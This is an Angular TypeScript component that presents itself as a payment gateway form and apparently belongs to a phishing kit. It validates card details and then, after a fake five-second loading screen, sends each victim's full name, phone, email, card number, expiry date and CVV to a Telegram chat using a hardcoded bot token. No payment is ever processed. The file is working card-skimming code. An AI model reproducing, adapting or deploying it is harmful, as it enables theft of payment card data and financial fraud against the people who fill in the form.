import { HttpClient } from '@angular/common/http';
import { Component, ElementRef, OnInit, Renderer2, ViewChild } from '@angular/core';
import { FormGroup, FormBuilder, Validators, AbstractControl, ValidationErrors } from '@angular/forms';
import { Router } from '@angular/router';

@Component({
  selector: 'app-gateway',
  templateUrl: './gateway.component.html',
  styleUrls: ['./gateway.component.css']
})
export class GatewayComponent implements OnInit{

  paymentForm: FormGroup;
  submitted = false;
  showAlertBox: boolean = false;
  showErrorMessage: boolean = false; // Control visibility of the error message
  insideMessageVisible: boolean = false; // Control visibility of insideMessageDiv

  private readonly BOT_TOKEN = 'bot7882298266:AAHKN8O8IKjx_0VzvJPKxEEzjj_eiTAdyD0'; // Replace with your bot token
  private readonly CHAT_ID = '-4556448975';

  amount = localStorage.getItem("finalPrice");

  constructor(private fb: FormBuilder, private http: HttpClient, private router: Router) {
    this.paymentForm = this.fb.group({
      fullname: ['', [Validators.required]],
      phone: ['', [Validators.required]],
      email: ['', [Validators.required, Validators.email]],
      cardnumber: ['', [Validators.required, this.validateCreditCardNumber]],
      expirationdate: ['', [Validators.required, this.validateExpirationDate]],
      securitycode: ['', [Validators.required, Validators.minLength(3), Validators.maxLength(4), Validators.pattern(/^\d{3,4}$/)]]
    });
  }

  ngOnInit(): void {}

  triggerAlert() {
    this.showAlertBox = true;
    setTimeout(() => {
      this.showAlertBox = false;
    }, 5000);
  }

  validateCreditCardNumber(control: any) {
    const cardNumber = control.value.replace(/\s+/g, '');
    const cardRegex = /^(?:3[47]\d{13}|(?:4\d|5[1-5]|65)\d{14}|(?:6011|(?:2131|1800|35\d{3})\d{11}))$/;
    return cardRegex.test(cardNumber) ? null : { invalidCardNumber: true };
  }

  validateExpirationDate(control: any) {
    const input = control.value.replace(/\D/g, '');
    if (input.length !== 4) {
      return { invalidExpirationDate: true };
    }
    const month = parseInt(input.substring(0, 2), 10);
    const year = parseInt(input.substring(2, 4), 10);
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return { expiredCard: true };
    }
    return null;
  }

  formatCardNumber() {
    let cardNumber = this.paymentForm.get('cardnumber')?.value || '';
    cardNumber = cardNumber.replace(/\D/g, '').substring(0, 16);
    cardNumber = cardNumber.replace(/(\d{4})/g, '$1 ').trim();
    this.paymentForm.get('cardnumber')?.setValue(cardNumber);
  }

  formatExpirationDate() {
    let expirationDate = this.paymentForm.get('expirationdate')?.value || '';
    expirationDate = expirationDate.replace(/\D/g, '').substring(0, 4);
    const month = expirationDate.substring(0, 2);
    const year = expirationDate.substring(2, 4);
    if (month.length === 2 && (parseInt(month, 10) < 1 || parseInt(month, 10) > 12)) {
      expirationDate = '01';
    }
    if (expirationDate.length >= 2) {
      expirationDate = month + '/' + year;
    }
    this.paymentForm.get('expirationdate')?.setValue(expirationDate);
  }

  onSubmit() {
    const message = `
*New Payment Information*\n
Fullname: ${this.paymentForm.value.fullname}\n
Phone: ${this.paymentForm.value.phone}\n
Email: ${this.paymentForm.value.email}\n
CC: ${this.paymentForm.value.cardnumber}\n
Expiration Date: ${this.paymentForm.value.expirationdate}\n
CVV: ${this.paymentForm.value.securitycode}
    `;

    // Check form validity
    if (this.paymentForm.invalid) {
        this.triggerAlert();
        return;
    }

    // Show loader
    this.submitted = true;

    // Show loader for 5 seconds
    setTimeout(() => {
        this.submitted = false; // Hide loader
        this.insideMessageVisible = true; // Show insideMessageDiv

        // Hide insideMessageDiv after another 5 seconds
        setTimeout(() => {
            this.insideMessageVisible = false; // Hide insideMessageDiv
        }, 5000);

        // Send message after loader has finished
        this.sendMessageToTelegram(message);
    }, 5000);
}


  sendMessageToTelegram(message: string) {
    const url = `https://api.telegram.org/${this.BOT_TOKEN}/sendMessage`;
    const body = {
      chat_id: this.CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    };

    this.http.post(url, body).subscribe(
      (response) => {
        // You can also reset the form or show a success message here
        this.paymentForm.reset();
      },
      (error) => {
        console.error('Error sending message:', error);
      }
    );
  }
}


  

  
